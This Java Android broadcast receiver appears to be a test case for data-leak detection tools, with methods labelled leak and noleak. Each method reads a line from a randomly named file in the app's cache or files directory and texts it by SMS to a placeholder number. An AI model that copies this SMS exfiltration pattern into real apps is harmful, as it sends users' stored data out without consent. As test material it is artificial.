package com.example.manipulatedfilename;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStreamReader;
import java.util.Random;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.SmsManager;

public class MyReceiver extends BroadcastReceiver
{
	public static final String ACTION = "MY_ACTION";
	public static final String CATEGORY = "MY_CATEGROY";
	@Override
	public void onReceive(Context context, Intent intent)
	{
		leak(context);
		//noleak1(context);
		//noleak2(context);
	}
	public void noleak1(Context context)
	{
		File filesDir = context.getFilesDir();
		StringBuilder builder = new StringBuilder();
		Random rand = new Random();
		builder.append("myfile_");
		if(rand.nextBoolean())
			builder.append(rand.nextInt());
		String fileName = builder.toString() + ".txt";
		File file = new File(filesDir, fileName);
		BufferedReader reader = null;
		try
		{
			reader = new BufferedReader(new InputStreamReader(new FileInputStream(file)));
			String line = reader.readLine();
			SmsManager smsManager = SmsManager.getDefault();
			smsManager.sendTextMessage("0900000000", null, line, null, null);
		}
		catch(Exception ex)
		{
			ex.printStackTrace();
		}
		finally
		{
			if(reader != null)
			{
				try
				{
					reader.close();
				}
				catch(Exception ex)
				{}
			}
		}
	}
	public void noleak2(Context context)
	{
		File cachesDir = context.getCacheDir();
		StringBuilder builder = new StringBuilder();
		Random rand = new Random();
		builder.append("myfile_");
		if(rand.nextBoolean())
			builder.append(rand.nextInt());
		String fileName = builder.toString() + ".db";
		File file = new File(cachesDir, fileName);
		BufferedReader reader = null;
		try
		{
			reader = new BufferedReader(new InputStreamReader(new FileInputStream(file)));
			String line = reader.readLine();
			SmsManager smsManager = SmsManager.getDefault();
			smsManager.sendTextMessage("0900000000", null, line, null, null);
		}
		catch(Exception ex)
		{
			ex.printStackTrace();
		}
		finally
		{
			if(reader != null)
			{
				try
				{
					reader.close();
				}
				catch(Exception ex)
				{}
			}
		}
	}
	public void leak(Context context)
	{
		File cacheDir = context.getCacheDir();
		StringBuilder builder = new StringBuilder();
		Random rand = new Random();
		builder.append("myfile_");
		if(rand.nextBoolean())
			builder.append(rand.nextInt());
		String fileName = builder.toString() + ".txt";
		File file = new File(cacheDir, fileName);
		BufferedReader reader = null;
		try
		{
			reader = new BufferedReader(new InputStreamReader(new FileInputStream(file)));
			String line = reader.readLine();
			SmsManager smsManager = SmsManager.getDefault();
			smsManager.sendTextMessage("0900000000", null, line, null, null);
		}
		catch(Exception ex)
		{
			ex.printStackTrace();
		}
		finally
		{
			if(reader != null)
			{
				try
				{
					reader.close();
				}
				catch(Exception ex)
				{}
			}
		}
	}

}
